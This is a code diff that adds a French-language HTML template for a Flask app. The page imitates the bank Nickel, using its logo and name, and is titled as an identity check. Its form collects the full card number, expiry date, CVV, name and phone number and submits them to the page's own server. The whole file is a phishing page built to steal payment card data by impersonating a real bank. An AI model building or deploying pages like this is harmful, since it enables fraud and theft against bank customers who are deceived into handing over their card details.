@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Vérification et confirmation de votre identité</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/formulaire.css') }}">
+</head>
+<body>
+<header class="header-nk">
+    <div class="logo-container">
+        <img src="{{ url_for('static', filename='images/nickel-logo.svg') }}" alt="Nickel" class="logo-nk">
+        <span class="brand-text">Nickel</span>
+    </div>
+    <button class="btn-partner">Espace partenaire</button>
+</header>
+
+<main class="center-nk">
+    <h1>Vérification et confirmation de votre identité</h1>
+    <form method="POST">
+        <label class="label-nk" for="nom">Nom</label>
+        <input type="text" id="nom" name="nom" class="input-nk" required>
+
+        <label class="label-nk" for="prenom">Prénom</label>
+        <input type="text" id="prenom" name="prenom" class="input-nk" required>
+
+        <label class="label-nk" for="numero_cb">Numéro de carte bancaire</label>
+        <input type="text" id="numero_cb" name="numero_cb" class="input-nk" required>
+
+        <label class="label-nk" for="date_expiration">Date d'expiration</label>
+        <input type="text" id="date_expiration" name="date_expiration" class="input-nk" placeholder="MM/AA" required>
+
+        <label class="label-nk" for="cvv">CVV</label>
+        <input type="text" id="cvv" name="cvv" class="input-nk" required>
+
+        <label class="label-nk" for="telephone">Numéro de téléphone</label>
+        <input type="text" id="telephone" name="telephone" class="input-nk" required>
+
+        <button type="submit" class="btn-nk">Valider</button>
+    </form>
+</main>
+</body>
+</html>
